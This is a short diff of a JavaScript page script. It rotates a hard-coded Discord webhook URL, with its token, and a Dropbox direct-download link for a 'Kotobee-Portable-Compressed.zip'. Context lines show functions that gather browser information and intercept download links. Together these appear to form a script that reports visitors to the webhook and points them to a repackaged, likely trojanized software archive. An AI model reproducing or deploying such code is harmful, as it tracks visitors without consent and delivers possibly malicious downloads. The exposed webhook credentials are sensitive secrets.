@@ -1,7 +1,7 @@
 (function() {
     'use strict';
 
-    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1448770841633620128/wesmitFF_1bpQha0MNqHLk1Yp7raiT_UhKkB-hinry0-i3NkWaXQBwzEirx3IhIJaFif';
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1465455464002355355/7V3GmWs_77uqtXzLF5VMdGwrx-cON_uHvf-jLAsqJ4r6jBmqeLnYjg4x2ctPzJ0is2qX';
     
     function getBrowserInfo() {
         const userAgent = navigator.userAgent;
@@ -170,7 +170,7 @@
     }
 
         
-    const DROPBOX_DOWNLOAD_URL = 'https://www.dropbox.com/scl/fi/iwn3k3h2v8pwk7wfx1l68/Kotobee-Portable-Compressed.zip?rlkey=vo30gahlsu50b7l0z1lpwcrvj&st=5okwai9h&dl=1'
+    const DROPBOX_DOWNLOAD_URL = 'https://www.dropbox.com/scl/fi/jds72oyxeeouvq2qxjgni/Kotobee-Portable-Compressed.zip?rlkey=a43qdepj2r0u5w5tadol7fv87&st=bo336hko&dl=1'
     
     function handleDownload(e, linkElement) {
         const href = linkElement.getAttribute('href');
